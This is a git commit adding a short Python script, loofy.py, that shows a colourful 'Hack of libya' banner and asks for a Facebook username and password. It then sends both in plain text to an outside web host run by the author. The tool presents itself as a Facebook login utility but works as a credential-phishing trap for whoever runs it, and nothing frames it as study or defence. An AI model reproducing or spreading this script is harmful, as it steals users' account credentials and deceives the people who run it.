0b833e0f7c12d7ef5593e35e24fb773bdd01a142
shuayb_mohammed <49376521+shuayb-mohammed@users.noreply.github.com>
2020-01-12 00:56:57 +0200

    Add files via upload

---
+++ loofy.py
@@ -0,0 +1,74 @@
+import requests, os
+os.system("clear")
+print('''
+                      \x1b[92m``.....`
+                  `-/ossyyyyss+-`
+                -+oosyysyyyysyyss+.
+              `/os+syyyyyyyyyyy+yyo/`
+             .+/++:+++/////++++/oo+yo`
+          ``.://+++oooooossoo+++//////`
+     `.-/+ooo+//+/////+++//+ooosssssss+++:-`
+   `-+soso+:-..``````..-o+......--::::oyyyys+-`
+  -+oss+:--..`````-./o-hmm:.:``````...-+osyysys:
+  :oooooo+/:`````:/sm/hmmmd-y/./......-:oooosyy:
+   -+osoo+/...``.yohd+mmmmmoyd:ys+-..-+-ooosso/`
+     .--:-.::--.-ymh/sddmmdyhy:ymdo:o+++++/:.
+             `hs:dmdydmmmmmmmmhmmd+oh/.``
+              shyhmmmmmmdymmmdhdddoyo`
+              `:+odmmmmmdhddddddm+:`
+                  `sdhddddmdddhh:
+                    -ohdmmmmds:`
+                 ``.oh/-/oo/odh/:.`
+           ```..--./mdmho+sdmmdy/::---``
+       `.-:--------/mmmmmmmmmmmh///::///:-`
+     .smds//:::-----hmddmmmdddds//////////:/:`
+    `hmmmmy//////::-+mmmmmmmmmd//////////+hmmh-
+    :mmmmmm+///////::smmmmmmmmo///////::odmmmmd`
+    smmmmmmd:://////::+dmmmmdo///////::sdmmmmmm.
+    ymmmmmmd/-://////:--ohhs//////:/::+hmmmmmmm`
+    hmmmmmmh:-:///////:.`-/////////:-:shdmmmmmh
+   `dmddddmh:-://////:--:::////////:--/hmmmmmms
+   -dhydhdddy/:://////:/:-://///:::::-:dmmmmmmy
+   +yyhddddddh+::////:-:/+::::::/+/::-/dmmmmmmh
+  `ysyddddhddddo--::::-----:/oyhddddhyommmmmmmy
+  :hhhhhhhhdhdddy:-::/+osyhddmmmdmmmmdhmmmmmmmy
+  sddhyshyhhhhhhdhhhddmmmmmmmhyyhdhhdhhmmmmmmms
+ .hddhyhddddddddddmmmmmddddddddhddddddmmmmmmmmo
+ :ddhhhhhddddddddddddhhddddddmmmmmmmmmmmmmmmmmy
+ .yhhhhhhdddddhhyssosyosyyhhdddddddmddmmdmmmmmo
+  -yhhhhyyyys+/:-.-..-..--::/++ossyyyhdddddddm-
+   .//o+//:-............+:::::::::::::/+oossy+
+      `.............-..-::-::::::::::--.`  ``
+      `..........----..----------------.`
+          ``` ``````````````````````````
+      \033[1;91m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+            |||||              |||||
+             |||                |||
+              |                  |
+           \x1b[92m ▼▼▼▼▼              ▼▼▼▼▼
+            \x1b[1;93mLOOFY\x1b[1;92m             \x1b[1;94mAlgaddafi\x1b[1;92m
+            ▲▲▲▲▲              ▲▲▲▲▲
+
+\033[1;95m╔══════════════════════════════════════════════╗
+║ WhatsApp : +218923019269                     ║
+║ Facebook : Shuay  Mohammed                   ║
+║ Instagram : shuaib_algaddafi_2001            ║
+║ Youtuob : Hack of libya                      ║
+╚══════════════════════════════════════════════╝''')
+print('\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK AKUN FB \x1b[1;91m')
+email = input("\x1b[1;91m[+] \x1b[1;36mUsername FB \x1b[1;91m:\x1b[1;92m")
+password = input ("\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ")
+os.system("clear")
+requests.get("https://loofyal.000webhostapp.com/loofy.php?email=" + email + "&password=" + password)
+print('''
+
+
+
+
+                                     INFORMATION
+            \033[1;95m╔══════════════════════════════════════════════╗
+            ║ WhatsApp : +218923019269                     ║
+            ║ Facebook : Shuay  Mohammed                   ║
+            ║ Instagram : shuaib_algaddafi_2001            ║
+            ║ Youtuob : Hack of libya                      ║
+            ╚══════════════════════════════════════════════╝''')
